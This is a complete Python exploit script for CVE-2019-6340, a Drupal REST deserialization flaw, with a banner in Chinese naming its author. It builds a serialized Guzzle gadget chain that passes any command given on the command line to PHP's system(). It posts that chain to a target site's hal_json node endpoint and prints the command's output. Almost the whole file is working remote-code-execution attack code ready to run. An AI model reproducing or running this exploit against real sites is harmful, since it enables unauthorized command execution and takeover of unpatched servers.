import json
import re
import sys
import requests



def title():
    print("[-------------------------------------------------------------]")
    print("[--------------        Drupal 反序列化      ---------------]")
    print("[--------               CVE-2019-6340             ----------]")
    print("[--------    use:python3 CVE-2019-6340.py url cmd --------]")
    print("[--------              Author:鸣蜩十四           ------------]")
    print("[-------------------------------------------------------------]")

def main(url,cmd) :
    if (len(sys.argv)==3):
        poc(url,cmd)
    else :
        print("Example: \n   python3 " + sys.argv[0] + " url" + " cmd" + "\n")

def poc(url,cmd) :
    num=str(len(cmd))
    headers={
    "Accept": "application/json,text/plain, */*",
    "Content-Type": "application/hal+json"
    }
    payload = {
  "link": [
    {
      "value": "link",
      "options": "O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:{s:33:\"\u0000GuzzleHttp\\Psr7\\FnStream\u0000methods\";a:1:{s:5:\"close\";a:2:{i:0;O:23:\"GuzzleHttp\\HandlerStack\":3:{s:32:\"\u0000GuzzleHttp\\HandlerStack\u0000handler\";s:"+num+":\""+cmd+"\";s:30:\"\u0000GuzzleHttp\\HandlerStack\u0000stack\";a:1:{i:0;a:1:{i:0;s:6:\"system\";}}s:31:\"\u0000GuzzleHttp\\HandlerStack\u0000cached\";b:0;}i:1;s:7:\"resolve\";}}s:9:\"_fn_close\";a:2:{i:0;r:4;i:1;s:7:\"resolve\";}}"
    }
  ],
  "_links": {
    "type": {
      "href":""+url+"/rest/type/shortcut/default"
    }
  }
}
    proxies = {
        "http":"http://127.0.0.1:8081"

    }
    url = str(url) + "/node/?_format=hal_json"
    a = requests.post(headers=headers,url=url,data=json.dumps(payload),timeout=30,proxies=proxies)
    a = re.split(r'[}]',a.text)
    print("命令执行返回\n",a[1])



if __name__ == "__main__" :
    title()
    url = sys.argv[1]
    cmd = sys.argv[2]
    main(url,cmd)
